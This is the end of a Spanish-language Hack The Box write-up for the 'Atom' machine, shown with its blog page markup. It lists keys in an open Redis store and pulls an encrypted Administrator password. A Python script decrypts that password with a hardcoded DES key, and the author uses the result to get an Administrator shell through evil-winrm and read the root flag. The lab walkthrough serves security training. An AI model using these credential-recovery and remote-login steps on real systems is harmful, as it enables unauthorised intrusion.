+<pre><code class="language-bash">10.10.10.237:6379&gt; KEYS *
+1) "pk:ids:User"
+2) "pk:ids:MetaDataClass"
+3) "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
+4) "pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"
+10.10.10.237:6379&gt; GET pk:ids:User
+(error) WRONGTYPE Operation against a key holding the wrong kind of value
+10.10.10.237:6379&gt; GET pk:ids:MetaDataClass
+(error) WRONGTYPE Operation against a key holding the wrong kind of value
+10.10.10.237:6379&gt; GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
+"{\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"Role\":\"Admin\",\"Inactive\":false,\"TimeStamp\":637530169606440253}"
+</code></pre>
+<p>Obtenemos una contraseña enctryptada <code>Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi</code> con el mismo formato que la anterior que encontramos, asi que podemos usar el mismo exploit que previamente usamos para decencriptarla.</p>
+
+<pre><code class="language-python">import json
+import base64
+from des import * #python3 -m pip install des
+import sys
+
+hash = 'Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'
+
+hash = base64.b64decode(hash.encode('utf-8'))
+key = DesKey(b"7ly6UznJ")
+print(key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))
+</code></pre>
+
+<p>Ejectamos nuevamente el exploit y obtenemos una nueva contraseña.</p>
+
+<pre><code class="language-bash">❯ python3 portable.py
+kidvscat_admin_@123
+</code></pre>
+
+<p>Podemos a intentar con esta nueva conectarnos como el usuario <code>Administrator</code> usando <code>winrm</code>.</p>
+
+<pre><code class="language-bash">❯ evil-winrm -i 10.10.10.237 -u 'Administrator' -p 'kidvscat_admin_@123'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+atom\administrator
+</code></pre>
+
+<p>Nos conectamos satisfactoriamente y ahora podemos dirigirnos al directorio personal del usuario <code>Administrator</code> y visualizar la segunda flag <code>root.txt</code>.</p>
+
+<pre><code class="language-cmd">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd C:\Users\Administrator\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         8/10/2023   5:27 PM             34 root.txt
+
+
+Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+f55c47e3b749e8ae956f980fba1dc782
+</code></pre>
+
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Atom - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Atom" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
